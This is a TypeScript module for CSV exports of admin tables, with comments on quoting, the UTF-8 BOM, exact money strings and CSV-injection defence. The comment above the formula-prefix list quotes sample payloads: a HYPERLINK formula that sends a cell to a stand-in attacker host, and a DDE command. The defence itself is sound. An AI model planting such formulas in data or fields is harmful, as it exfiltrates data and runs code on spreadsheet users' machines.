/**
 * CSV serialisation for the admin table exports.
 *
 * ── Why this is hand-written rather than a dependency ───────────────────────
 *
 * The whole job is three rules — quote, escape, prefix — and every one of them
 * is a correctness property this file states and `test/admin-export.spec.ts`
 * asserts. A library would move those three rules somewhere nobody reads, and
 * the one that matters most (formula neutralisation, below) is NOT what most CSV
 * libraries do by default.
 *
 * ── The money rule, which is the reason this file has no formatter ──────────
 *
 * ARCHITECTURE §6.1: a monetary value is `NUMERIC(28,8)` in the database, a
 * `Decimal` in code, and a STRING across the boundary. It arrives here as the
 * string the database produced — '250.00000000' — and it leaves as that same
 * string, character for character.
 *
 * There is deliberately no number formatting anywhere in this module. Not
 * `toFixed`, not `Intl.NumberFormat`, not a thousands separator. Every one of
 * those takes a `number`, and `Number('12345678901234567.89')` has already lost
 * the value before formatting starts. A CSV is also the one output most likely
 * to be re-imported into something that does arithmetic, so a rounded cell here
 * becomes a wrong number in somebody's reconciliation spreadsheet.
 *
 * So `cell()` below takes `string | number | Date | null | undefined` and, for a
 * string, only ever ADDS quoting. It never reinterprets the value.
 */

/**
 * The bytes that make Excel read the file as UTF-8.
 *
 * Without it, Excel on Windows decodes a CSV using the system ANSI codepage, so
 * a client named `Müller` opens as `MÃ¼ller` and an Arabic name becomes mojibake
 * entirely. These exports carry client names from a global client base, so this
 * is not a nicety — it is whether the file is readable at all.
 *
 * Emitted once, at the very start of the body, before the header row.
 */
export const UTF8_BOM = '﻿';

/**
 * Characters that make a spreadsheet treat a cell as a FORMULA rather than text.
 *
 * ── CSV injection, and why a leading `-` is in this list ────────────────────
 *
 * A cell beginning `=`, `+`, `-` or `@` is evaluated by Excel, LibreOffice and
 * Google Sheets on open. `=HYPERLINK("http://attacker/"&A1,"Click")` in a client
 * name field exfiltrates the row next to it; `=cmd|'/c calc'!A1` has historically
 * reached DDE execution. The values in these exports are attacker-controlled in
 * the most direct sense available — a client types their own first name at
 * registration and an administrator later downloads it.
 *
 * `-` is included even though a negative number legitimately starts with one.
 * That is a deliberate trade and it is why money columns are unaffected in
 * practice: the ledger's own negative amounts are still emitted as the exact
 * string the database produced, prefixed with an apostrophe that the spreadsheet
 * strips on display. Getting a leading-minus text cell wrong is a cosmetic
 * problem; getting a formula wrong is code execution on the reviewer's machine.
 */
const FORMULA_LEADERS = ['=', '+', '-', '@'];

/**
 * Characters that force a field to be quoted, per RFC 4180.
 *
 * `\r` is listed separately from `\n` on purpose: a lone CR inside a field
 * breaks a parser that splits on it, and an address field pasted from Windows
 * carries them.
 */
const MUST_QUOTE = [',', '"', '\n', '\r'];

/**
 * One CSV field, escaped.
 *
 * A `Date` becomes ISO-8601 (R-2.7) rather than a locale string: an export is an
 * audit artefact that may be read in a different timezone from the one that
 * produced it, and `String(date)` is both locale-dependent and second-resolution.
 *
 * `null` and `undefined` both become an empty field, not the text 'null'. In a
 * spreadsheet a literal 'null' reads as a value somebody entered.
 */
export function cell(value: string | number | Date | boolean | null | undefined): string {
  if (value === null || value === undefined) return '';

  let text: string;
  if (value instanceof Date) {
    text = value.toISOString();
  } else if (typeof value === 'boolean') {
    text = value ? 'true' : 'false';
  } else {
    /*
     * `String(value)` for a number, and NOT for a monetary one.
     *
     * Money reaches this function already a string and takes the branch below
     * untouched. This branch exists for genuine counts — how many clients carry
     * a tag, a KYC step number — where the value was a number in the database
     * too and there is nothing to lose.
     */
    text = String(value);
  }

  // Formula neutralisation FIRST, then quoting. The apostrophe has to be inside
  // the quotes, or a quoted `"=cmd"` is still a formula once the parser unwraps
  // it.
  if (FORMULA_LEADERS.some((leader) => text.startsWith(leader))) {
    text = `'${text}`;
  }

  if (MUST_QUOTE.some((char) => text.includes(char))) {
    // RFC 4180: a literal quote inside a quoted field is written twice.
    return `"${text.replace(/"/g, '""')}"`;
  }

  return text;
}

/** One CSV record, terminated CRLF as RFC 4180 specifies. */
export function row(
  values: readonly (string | number | Date | boolean | null | undefined)[],
): string {
  return `${values.map(cell).join(',')}\r\n`;
}

/**
 * A column: the header an operator reads, and how to get the value from a row.
 *
 * The header is human-readable ('Client email', not 'email') because the file is
 * opened by people rather than parsed by code — and where it IS parsed, it is
 * parsed by somebody who opened it first.
 */
export interface CsvColumn<T> {
  header: string;
  value: (row: T) => string | number | Date | boolean | null | undefined;
}

/** The header row for a column set, BOM-prefixed — the start of every export. */
export function csvHeader<T>(columns: readonly CsvColumn<T>[]): string {
  return UTF8_BOM + row(columns.map((column) => column.header));
}

/** One data row against a column set. */
export function csvRow<T>(columns: readonly CsvColumn<T>[], item: T): string {
  return row(columns.map((column) => column.value(item)));
}
